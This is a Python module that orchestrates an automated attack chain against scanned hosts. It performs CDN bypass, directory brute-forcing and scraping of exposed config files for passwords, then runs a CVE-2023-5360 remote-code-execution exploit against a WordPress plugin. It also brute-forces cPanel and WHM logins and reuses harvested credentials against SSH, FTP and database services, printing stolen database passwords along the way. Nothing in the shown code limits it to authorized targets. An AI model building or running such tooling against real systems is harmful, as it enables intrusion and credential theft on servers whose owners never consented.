"""Extractor router — runs extractors in priority order with credential injection."""

from __future__ import annotations

import os
import configparser
import threading
from typing import Any

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def _run_with_timeout(func: Any, seconds: int = 60) -> Any:
    """Run a callable with a hard timeout. Returns None if it exceeds the limit or crashes.

    Args:
        func (callable): Function to run.
        seconds (int): Timeout in seconds.

    Returns:
        Any | None: Return value of func, or None if timed out or exception raised.
    """
    result: list[Any] = [None]
    exception: list[BaseException | None] = [None]

    def target() -> None:
        try:
            result[0] = func()
        except BaseException as e:
            exception[0] = e

    t = threading.Thread(target=target, daemon=True)
    t.start()
    t.join(timeout=seconds)
    if exception[0]:
        print(f"  [TIMEOUT-WRAPPER] Caught: {type(exception[0]).__name__}: {exception[0]}", flush=True)
    elif t.is_alive():
        print(f"  [TIMEOUT-WRAPPER] Timed out after {seconds}s", flush=True)
    return result[0]


class ExtractorRouter:
    """Routes targets through extractors in priority order with credential sharing."""

    def __init__(self, results: dict[str, Any], scanner: Any = None) -> None:
        """Initialize router with scan results and optional scanner reference.

        Args:
            results (dict): The results dict from PortScanner, keyed by domain_id.
            scanner (PortScanner): Scanner instance for re-scanning discovered origin IPs.
        """
        self.results = results
        self.scanner = scanner
        self.found_credentials: dict[str, list[tuple[str, str]]] = {}

        config = configparser.ConfigParser()
        config_path = os.path.join(BASE_DIR, '..', '..', '..', 'config', 'settings.ini')
        config.read(config_path)
        self.run_exploit: bool = config.getboolean('Exploit', 'run_exploit', fallback=False)

    def run(self) -> None:
        """Process all targets through extractors in priority order."""
        print(f"[DEBUG] Router.run() called, {len(self.results)} targets", flush=True)
        for domain_id, data in list(self.results.items()):
            print(f"[DEBUG] Processing {domain_id}", flush=True)
            ip: str = data['ip']
            host: str = data['host']
            print(f"\n[ROUTER] Checking extractors for {host} ({ip})")
            print(f"[DEBUG] open_ports: {data['open_ports']}", flush=True)

            # 1. CDN bypass
            print(f"[DEBUG] Step 1: CDN bypass", flush=True)
            self._run_cdn_bypass(domain_id, ip, host)

            # 2. Web recon (Nikto)
            print(f"[DEBUG] Step 2: Nikto", flush=True)
            if self._has_port(data, 80) or self._has_port(data, 443):
                port = 443 if self._has_port(data, 443) else 80
                www_host = f"www.{host}" if not host.startswith('www.') else host
                self._run_nikto(domain_id, ip, www_host, port)

                # 2.5 Exploit Royal Elementor if detected by WPScan
                wpscan: dict[str, Any] = self.results[domain_id].get('wpscan', {})
                if 'royal-elementor-addons' in wpscan.get('plugins', {}):
                    self._run_royal_elementor_exploit(domain_id, ip, www_host, port)

            # 3. Gobuster
            print(f"[DEBUG] Step 3: Gobuster", flush=True)
            if self._has_port(data, 80) or self._has_port(data, 443):
                port = 80 if self._has_port(data, 80) else 443
                www_host = f"www.{host}" if not host.startswith('www.') else host
                self._run_gobuster(domain_id, ip, www_host, port)

            # 4. Config scraper
            print(f"[DEBUG] Step 4: Config scraper", flush=True)
            self._run_config_scraper(domain_id, ip, host)

            # 4b. WebDAV
            print(f"[DEBUG] Step 4b: WebDAV", flush=True)
            for port_entry in data['open_ports']:
                if port_entry['service'] in ('HTTP', 'HTTPS', 'WebDAV', 'WebDAV-SSL'):
                    self._run_webdav(domain_id, ip, host, port_entry['port'])

            # 4c. DNS zone transfer
            print(f"[DEBUG] Step 4c: DNS AXFR", flush=True)
            if self._has_port(data, 53):
                self._run_dns_axfr(domain_id, ip, host)

            # 5. cPanel brute force
            print(f"[DEBUG] Step 5: cPanel/WHM", flush=True)
            if self._has_port(data, 2083):
                self._run_cpanel(domain_id, ip, host)
            if self._has_port(data, 2087):
                self._run_whm(domain_id, ip, host)

            # 6. Service extractors
            print(f"[DEBUG] Step 6: Service extractors", flush=True)
            for port_entry in data['open_ports']:
                port = port_entry['port']
                service: str = port_entry['service']
                if service == 'SSH':
                    if self.found_credentials.get(domain_id):
                        print(f"  [SKIP] Port {port} (SSH) — credentials already found")
                    else:
                        self._dispatch(domain_id, ip, port, service)
                else:
                    self._dispatch(domain_id, ip, port, service)

            print(f"[DEBUG] All steps complete for {host}", flush=True)

    def _has_port(self, data: dict[str, Any], port: int) -> bool:
        """Check if a specific port is in the target's open ports.

        Args:
            data (dict): Target data dict.
            port (int): Port number to check.

        Returns:
            bool: True if port is open.
        """
        return any(p['port'] == port for p in data['open_ports'])

    def _run_cdn_bypass(self, domain_id: str, ip: str, host: str) -> None:
        """Run CDN bypass detection and trigger re-scan if origin IP is found."""
        try:
            from src.utils.extractors.cdn_bypass import CDNBypassDetector
            detector = CDNBypassDetector(ip=ip, port=443, host=host)
            result = _run_with_timeout(detector.run, seconds=30)
            if result and result.get('cdn') and result.get('origin_ip'):
                origin_ip: str = result['origin_ip']
                self.results[domain_id]['cdn_bypass'] = result
                if self.scanner:
                    print(f"\n[ROUTER] Re-scanning origin IP {origin_ip} for {host}")
                    self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
                    self.scanner._export_json()
        except Exception as e:
            print(f"  [CDN] Error: {type(e).__name__}: {e}", flush=True)

    def _run_wpscan(self, domain_id: str, ip: str, host: str, port: int) -> None:
        """Run WPScan recon and inject discovered usernames into credential pool."""
        try:
            from src.utils.extractors.wpscan_extractor import WPScanExtractor
            extractor = WPScanExtractor(ip=ip, host=host, port=port)
            result = _run_with_timeout(extractor.run, seconds=120)
            if result and result['status'] == 'success':
                self.results[domain_id]['wpscan'] = result
                if result.get('users'):
                    self.found_credentials.setdefault(domain_id, [])
                    for user in result['users']:
                        for pwd in ['', 'admin', '123456', user]:
                            self.found_credentials[domain_id].insert(0, (user, pwd))
                    print(f"  [ROUTER] Injected {len(result['users'])} WPScan user(s) into credential pool")
        except Exception as e:
            print(f"  [WPScan] Error: {type(e).__name__}: {e}", flush=True)

    def _run_nikto(self, domain_id: str, ip: str, host: str, port: int) -> None:
        """Run Nikto web vulnerability scan and store findings."""
        try:
            from src.utils.extractors.nikto_extractor import NiktoExtractor
            extractor = NiktoExtractor(ip=ip, host=host, port=port)
            result = _run_with_timeout(extractor.run, seconds=90)
            if result and result['status'] == 'success':
                self.results[domain_id]['nikto'] = result
        except Exception as e:
            print(f"  [Nikto] Error: {type(e).__name__}: {e}", flush=True)

    def _run_royal_elementor_exploit(self, domain_id: str, ip: str, host: str, port: int) -> None:
        """Attempt CVE-2023-5360 unauthenticated file upload RCE against Royal Elementor Addons."""
        try:
            from src.utils.extractors.royal_elementor_exploit import RoyalElementorExploit  # type: ignore
            exploit = RoyalElementorExploit(host=host, ip=ip, port=port)
            result = _run_with_timeout(exploit.run, seconds=60)
            if result:
                self.results[domain_id]['royal_elementor_exploit'] = result
                if result['status'] == 'success' and result.get('db_credentials'):
                    creds: dict[str, str] = result['db_credentials']
                    user = creds.get('db_user')
                    password = creds.get('db_password')
                    if user and password:
                        self.found_credentials.setdefault(domain_id, [])
                        self.found_credentials[domain_id].insert(0, (user, password))
                        print(f"  [ROUTER] DB credentials from wp-config injected: {user}:{password}")
        except Exception as e:
            print(f"  [CVE-2023-5360] Error: {type(e).__name__}: {e}", flush=True)

    def _run_gobuster(self, domain_id: str, ip: str, host: str, port: int) -> None:
        """Run gobuster directory bruteforce, then feed config/backup findings into config scraper."""
        try:
            from src.utils.extractors.gobuster_extractor import GobusterExtractor
            from src.utils.extractors.http_config_scraper import HTTPConfigScraper

            extractor = GobusterExtractor(ip=ip, host=host, port=port)
            result = _run_with_timeout(extractor.run, seconds=120)
            if not result or result['status'] != 'success':
                return

            self.results[domain_id]['gobuster'] = result

            config_files: list[dict[str, Any]] = result.get('config_files') or []
            backup_files: list[dict[str, Any]] = result.get('backup_files') or []
            juicy = [e for e in config_files + backup_files if e.get('status') == '200']

            print(f"  [Gobuster] Feeding {len(juicy)} path(s) into config scraper...")
            scraper = HTTPConfigScraper(host=host, ip=ip)
            all_creds: dict[str, Any] = {}

            for entry in juicy:
                path: str = entry['path']
                content = scraper._fetch(path)
                if content:
                    found_creds = scraper._extract_credentials(content)
                    if found_creds:
                        all_creds[path] = found_creds
                        print(f"  [Gobuster] Credentials extracted from {path}: {found_creds}")

            if all_creds:
                self.results[domain_id].setdefault('config_credentials', {}).update(all_creds)
                passwords: set[str] = set()
                for path_creds in all_creds.values():
                    for key in ('db_password', 'password'):
                        if key in path_creds:
                            passwords.add(path_creds[key])
                if passwords:
                    self.found_credentials.setdefault(domain_id, [])
                    for user in ['root', 'admin', 'cpanel']:
                        for pwd in passwords:
                            self.found_credentials[domain_id].insert(0, (user, pwd))
                    print(f"  [ROUTER] Injected {len(passwords)} gobuster-scraped password(s) into credential pool")

        except Exception as e:
            print(f"  [Gobuster] Error: {type(e).__name__}: {e}", flush=True)

    def _run_cpanel(self, domain_id: str, ip: str, host: str) -> None:
        """Run cPanel brute force and store found credentials."""
        try:
            from src.utils.extractors.cpanel import CPanelExtractor
            cpanel_user = host.split('.')[0][:8]
            extractor = CPanelExtractor(ip=ip, port=2083, host=host, extra_usernames=[cpanel_user])
            print(f"  [cPanel] About to run extractor", flush=True)
            result = _run_with_timeout(extractor.run, seconds=60)
            print(f"  [cPanel] Extractor done: {result}", flush=True)
            if result and result.get('credentials'):
                creds = [(c['user'], c['password']) for c in result['credentials']]
                self.found_credentials[domain_id] = creds
                self.results[domain_id]['cpanel_credentials'] = result['credentials']
        except Exception as e:
            print(f"  [cPanel] Error: {type(e).__name__}: {e}", flush=True)

    def _run_whm(self, domain_id: str, ip: str, host: str) -> None:
        """Attempt WHM brute force on port 2087."""
        try:
            from src.utils.extractors.cpanel import CPanelExtractor
            cpanel_user = host.split('.')[0][:8]
            extractor = CPanelExtractor(ip=ip, port=2087, host=host, extra_usernames=[cpanel_user])
            result = _run_with_timeout(extractor.run, seconds=60)
            if result and result.get('credentials'):
                creds = [(c['user'], c['password']) for c in result['credentials']]
                self.found_credentials[domain_id] = creds
                self.results[domain_id]['whm_credentials'] = result['credentials']
        except Exception as e:
            print(f"  [WHM] Error: {type(e).__name__}: {e}", flush=True)

    def _run_config_scraper(self, domain_id: str, ip: str, host: str) -> None:
        """Run HTTP config scraper and inject found passwords into credential pool."""
        print(f"  [CONFIG] Starting...", flush=True)
        try:
            from src.utils.extractors.http_config_scraper import HTTPConfigScraper
            www_host = f"www.{host}" if not host.startswith('www.') else host
            scraper = HTTPConfigScraper(host=www_host, ip=ip)
            result = _run_with_timeout(scraper.run, seconds=30)
            print(f"  [CONFIG] Done.", flush=True)
            if result and result['credentials']:
                self.results[domain_id]['config_credentials'] = result['credentials']
                passwords: set[str] = set()
                for path_creds in result['credentials'].values():
                    for key in ('db_password', 'password'):
                        if key in path_creds:
                            passwords.add(path_creds[key])
                if passwords:
                    print(f"  [ROUTER] Injecting {len(passwords)} scraped passwords into credential pool")
                    self.found_credentials.setdefault(domain_id, [])
                    for user in ['root', 'admin', 'cpanel']:
                        for pwd in passwords:
                            self.found_credentials[domain_id].insert(0, (user, pwd))
        except Exception as e:
            print(f"  [CONFIG] Crashed: {type(e).__name__}: {e}", flush=True)

    def _run_webdav(self, domain_id: str, ip: str, host: str, port: int) -> None:
        """Attempt unauthenticated WebDAV PROPFIND file listing and PUT write test."""
        try:
            from src.utils.extractors.webdav import WebDAVExtractor
            extractor = WebDAVExtractor(ip=ip, port=port, host=host)
            result = _run_with_timeout(extractor.run, seconds=30)
            if result and result['status'] == 'open':
                self.results[domain_id].setdefault('extractors', {})[f'webdav_{port}'] = result
        except Exception as e:
            print(f"  [WebDAV] Error: {type(e).__name__}: {e}", flush=True)

    def _run_dns_axfr(self, domain_id: str, ip: str, host: str) -> None:
        """Attempt DNS AXFR zone transfer against port 53."""
        try:
            from src.utils.extractors.dns_axfr import DNSZoneTransfer
            extractor = DNSZoneTransfer(ip=ip, port=53, host=host)
            result = _run_with_timeout(extractor.run, seconds=15)
            if result and result['status'] == 'success':
                self.results[domain_id].setdefault('extractors', {})['dns_axfr'] = result
        except Exception as e:
            print(f"  [DNS-AXFR] Error: {type(e).__name__}: {e}", flush=True)

    def _dispatch(self, domain_id: str, ip: str, port: int, service: str) -> None:
        """Call the appropriate extractor based on service name.

        Args:
            domain_id (str): Target identifier.
            ip (str): Target IP.
            port (int): Open port number.
            service (str): Service label from scanner.
        """
        print(f"  [DISPATCH] port={port} service={service}", flush=True)

        from src.utils.extractors.mysql import MySQLExtractor
        from src.utils.extractors.postgres import PostgresExtractor
        from src.utils.extractors.ftp import FTPExtractor
        from src.utils.extractors.ssh import SSHExtractor

        extractors: dict[str, Any] = {
            'MySQL':      MySQLExtractor,
            'PostgreSQL': PostgresExtractor,
            'FTP':        FTPExtractor,
            'SSH':        SSHExtractor,
        }

        extractor_class = extractors.get(service)
        if extractor_class:
            print(f"  [MATCH] Port {port} ({service}) — launching extractor")
            try:
                if service == 'FTP':
                    extractor = FTPExtractor(
                        ip=ip,
                        port=port,
                        credentials=self.found_credentials.get(domain_id, []),
                    )
                else:
                    extractor = extractor_class(ip, port)
                result = _run_with_timeout(extractor.run, seconds=60)
                if result is None:
                    print(f"  [{service}] Timed out after 60s — skipping", flush=True)
                else:
                    key = f"{service.lower()}_{port}"
                    self.results[domain_id].setdefault('extractors', {})[key] = result
            except Exception as e:
                print(f"  [{service}] Error: {type(e).__name__}: {e}", flush=True)
        else:
            print(f"  [SKIP] Port {port} ({service}) — no extractor available")